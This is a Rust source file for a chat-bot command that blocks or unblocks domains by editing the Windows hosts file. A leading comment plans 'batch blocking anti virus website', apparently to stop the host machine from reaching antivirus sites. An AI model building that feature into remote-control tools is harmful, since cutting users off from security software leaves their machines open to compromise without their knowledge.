// todo: batch blocking anti virus website

use crate::prelude::*;
use std::fs::OpenOptions;
use std::io::{Write, BufRead, BufReader};
use std::path::Path;

#[poise::command(prefix_command, aliases("hosts"))]
pub async fn host(
    ctx: PoiseContext<'_>,
    #[description = "block/unblock <domain>"]
    #[rest]
    args: Option<String>,
) -> Result<(), Error> {
    let args = match args {
        Some(a) => a,
        None => {
            ctx.say("Usage: `.host <block|unblock> <domain>`").await?;
            return Ok(());
        }
    };

    let mut parts = args.split_whitespace();
    let action = match parts.next() {
        Some(a) => a.to_lowercase(),
        None => {
            ctx.say("Usage: `.host <block|unblock> <domain>`").await?;
            return Ok(());
        }
    };
    
    let domain = match parts.next() {
        Some(d) => d.trim(),
        None => {
            ctx.say("Usage: `.host <block|unblock> <domain>`").await?;
            return Ok(());
        }
    };

    let hosts_path = Path::new("C:\\Windows\\System32\\drivers\\etc\\hosts");
    
    if OpenOptions::new().write(true).append(true).open(hosts_path).is_err() {
        ctx.say("Access Denied: Administrator privileges required to edit hosts file.").await?;
        return Ok(());
    }

    match action.as_str() {
        "block" => {
            {
                let file = std::fs::File::open(hosts_path)?;
                let reader = BufReader::new(file);
                for line in reader.lines() {
                     if let Ok(l) = line {
                         if l.contains(domain) && !l.starts_with('#') {
                             ctx.say("Warning: Domain already appears effectively blocked.").await?;
                             return Ok(());
                         }
                     }
                }
            }
            
            let mut file = OpenOptions::new().append(true).open(hosts_path)?;
            writeln!(file, "127.0.0.1 {}", domain)?;
            ctx.say(format!("Blocked `{}`", domain)).await?;
        },
        "unblock" => {
            let lines: Vec<String> = {
                let file = std::fs::File::open(hosts_path)?;
                BufReader::new(file).lines().collect::<Result<_, _>>()?
            };
            
            let mut found = false;
            let mut new_content = String::new();
            
            for line in lines {
                if line.contains(domain) && line.trim_start().starts_with("127.0.0.1") {
                    found = true;
                } else {
                    new_content.push_str(&line);
                    new_content.push('\n');
                }
            }
            
            if found {
                std::fs::write(hosts_path, new_content)?;
                ctx.say(format!("Unblocked `{}`", domain)).await?;
            } else {
                ctx.say(format!("Domain `{}` not found in hosts blocklist.", domain)).await?;
            }
        },
        _ => {
            ctx.say("Usage: `.host <block|unblock> <domain>`").await?;
        }
    }

    Ok(())
}